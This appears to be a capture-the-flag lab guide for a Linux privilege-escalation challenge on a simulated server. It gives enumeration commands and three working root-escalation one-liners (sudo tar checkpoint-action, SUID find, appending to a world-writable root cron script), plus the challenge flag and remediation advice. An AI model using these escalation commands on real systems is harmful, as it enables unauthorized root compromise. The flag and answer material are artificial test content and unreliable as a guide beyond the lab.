# Challenge 8 - Linux Privilege Escalation

## Purpose

A web vulnerability gave the red team a low-privileged shell as `www-data` on `web-srv01`, an Aurora Outfitters application server. The objective is the flag in the root directory. The learner enumerates the host, identifies the misconfigurations, and escalates privileges using a practical, discoverable path.

All interaction runs through the in-page Kali terminal, starting from the `www-data` shell.

## Scope

| Item | Value |
| --- | --- |
| Company | Aurora Outfitters |
| Target | `10.20.40.10` (`web-srv01.internal.lab`) |
| Lab network | `10.20.0.0/16` |
| Initial foothold | Shell as `www-data` (uid=33) |
| Escalation surfaces | sudo `tar` (GTFOBins), SUID `find`, world-writable root cron script |
| Primary vulnerability | Local privilege-escalation misconfigurations |
| Flag | `RIVAN{privesc_sudo_tar_root}` |

## Learning Objectives

- Establish context on a compromised host (`whoami`, `id`, `uname -a`).
- Enumerate the three classic escalation surfaces: sudo rights, SUID binaries, and cron jobs.
- Map each finding to a concrete GTFOBins-style exploitation primitive.
- Escalate to root and read `/root/flag.txt`.
- Explain least-privilege and file-permission remediation.

## Required Evidence

1. The compromised host is enumerated (user, OS, filesystem).
2. sudo permissions are reviewed.
3. SUID binaries are located.
4. Scheduled root jobs are reviewed.
5. Privileges are escalated to root.
6. `/root/flag.txt` is read.
7. The exact flag is submitted.

## Student Workflow

### Step 0 - Start or Reset the Lab

Open `/challenges/linux-privilege-escalation` and select **Reset lab**. Reset restores the cron script, clears any root shells, evidence, and flag state.

### Step 1 - Enumerate the Host

```bash
whoami            # www-data
id                # uid=33(www-data) gid=33(www-data) groups=33(www-data)
uname -a          # Linux web-srv01 5.15.0-91-generic ...
```

A simulated `linpeas` summary is available in the terminal for learners who want the tooling view.

### Step 2 - Review the Escalation Surfaces

```bash
sudo -l                            # (root) NOPASSWD: /usr/bin/tar
find / -perm -4000 2>/dev/null     # ... /usr/bin/find (rwsr-xr-x)
cat /etc/crontab                   # * * * * * root /opt/scripts/nightly-backup.sh
ls -l /opt/scripts/nightly-backup.sh   # rw-rw-rw- (world-writable)
```

All three surfaces are misconfigured; any single one is a valid path.

### Step 3 - Escalate (any one path)

**Path A - sudo tar (GTFOBins checkpoint-action):**

```bash
sudo tar -cf /dev/null /dev/null --checkpoint=1 --checkpoint-action=exec=/bin/sh
```

**Path B - SUID find:**

```bash
find . -exec /bin/sh -p \;
```

**Path C - root cron script:**

```bash
echo "cp /root/flag.txt /tmp/flag.txt" >> /opt/scripts/nightly-backup.sh
```

The cron job runs the script as root every minute; the flag then appears, readable, in `/tmp`.

### Step 4 - Retrieve and Submit the Flag

```bash
whoami            # root
cat /root/flag.txt
```

The file contains `RIVAN{privesc_sudo_tar_root}` (mode `rw-------`, owner root — unreadable before escalation). Submit the exact value.

## Expected Evidence States

| Evidence | Trigger |
| --- | --- |
| Host enumerated | `whoami`, `id`, `uname`, or `linpeas` |
| sudo reviewed | `sudo -l` |
| SUID located | `find / -perm -4000` or linpeas |
| Cron reviewed | `cat /etc/crontab` or linpeas |
| Root obtained | Any of the three escalation commands completes |
| Flag retrieved | `/root/flag.txt` is read as root (or `/tmp/flag.txt` after cron) |
| Flag submitted | Server validates the exact flag |

## Reset Requirements

Reset must restore `/opt/scripts/nightly-backup.sh` to its original contents, remove `/tmp/flag.txt`, return the shell to `www-data`, and clear evidence and flag state.

## Instructor Notes

Offering three independent paths is deliberate: it rewards broad enumeration and lets learners pick the technique they can explain. The cron path additionally teaches patience and timing — the copy only happens on the next minute tick. `/etc/crontab` is intentionally readable and `/root/flag.txt` intentionally `600 root`; do not weaken those, they carry the lesson.

## Remediation

**Vulnerability:** Local privilege-escalation misconfigurations (sudo, SUID, cron).

**Attack surface:** Any local code execution as an unprivileged user.

**Impact:** Full root compromise of the application server.

**Root cause:** `tar` is sudo-permitted without a password, `find` carries the SUID bit, and a root-executed cron script is world-writable.

**Remediation:** Remove `tar` from sudoers or constrain it with argument allowlists, audit and strip unnecessary SUID bits, ensure root-run scripts are owned by root and not group/world-writable, run cron tasks as dedicated service accounts where possible, and monitor for integrity changes to privileged scripts.
